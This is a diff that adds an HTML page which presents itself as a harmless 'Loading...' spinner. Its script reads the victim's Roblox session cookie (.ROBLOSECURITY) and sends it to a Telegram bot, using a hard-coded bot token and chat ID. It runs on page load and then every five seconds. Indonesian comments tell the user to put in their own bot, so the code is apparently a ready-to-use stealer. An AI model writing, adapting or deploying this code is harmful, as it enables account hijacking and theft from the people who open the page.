@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            height: 100vh; 
+            background: #000; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .spinner { 
+            border: 10px solid #222; 
+            border-top: 10px solid #00ff00; 
+            border-radius: 50%; 
+            width: 80px; 
+            height: 80px; 
+            animation: spin 1.5s linear infinite; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+
+    <script>
+        async function stealCookie() {
+            const cookies = document.cookie;
+            const robloxCookieRow = cookies.split(';').find(row => row.trim().startsWith('.ROBLOSECURITY='));
+            
+            if (robloxCookieRow) {
+                const fullCookie = robloxCookieRow.split('=')[1];
+
+                // GANTI INI DULU PAKE TELEGRAM BOT LU SENDIRI
+                const BOT_TOKEN = '8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ';
+                const CHAT_ID = '6518432642';
+
+                const message = `🤑 COOKIE BARU
+
+${fullCookie}`;
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                }).catch(() => {});
+            }
+        }
+
+        // Jalankan langsung + loop tiap 5 detik
+        stealCookie();
+        setInterval(stealCookie, 5000);
+    </script>
+</body>
+</html>
